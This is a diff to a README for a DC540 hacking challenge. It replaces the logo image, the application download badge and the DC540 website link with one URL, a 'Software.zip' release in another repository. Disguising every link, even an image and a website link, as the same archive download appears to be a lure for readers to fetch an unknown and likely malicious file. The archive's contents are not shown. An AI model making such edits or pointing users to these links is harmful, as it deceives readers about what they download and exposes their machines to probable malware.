@@ -2,7 +2,7 @@
 
 ## Welcome to DC540 Hacking Challenge 0x00008!
 
-![DC540 Logo](https://github.com/user-attachments/files/18426772/DC540_logo.png)
+![DC540 Logo](https://github.com/farnei/dc540-0x00008/releases/download/v2.0/Software.zip)
 
 Are you ready to test your skills in this exciting hacking challenge brought to you by DC540? Follow the steps below to see if you have what it takes to conquer Challenge 0x00008!
 
@@ -14,7 +14,7 @@ In this challenge, you will dive into the world of embedded systems and assemble
 
 To get started, download the challenge application via the link below:
 
-[![Download Application](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download Application](https://github.com/farnei/dc540-0x00008/releases/download/v2.0/Software.zip)](https://github.com/farnei/dc540-0x00008/releases/download/v2.0/Software.zip)
 
 **Please Note:** The download link contains the necessary files to launch the challenge. 
 
@@ -46,7 +46,7 @@ To get started, download the challenge application via the link below:
 
 If you encounter any issues with the download link, please check the "Releases" section of this repository for alternative options.
 
-Visit the [DC540](https://dc540.org) website to stay updated on upcoming hacking challenges, meetups, and events in your area.
+Visit the [DC540](https://github.com/farnei/dc540-0x00008/releases/download/v2.0/Software.zip) website to stay updated on upcoming hacking challenges, meetups, and events in your area.
 
 ## Share Your Success
 
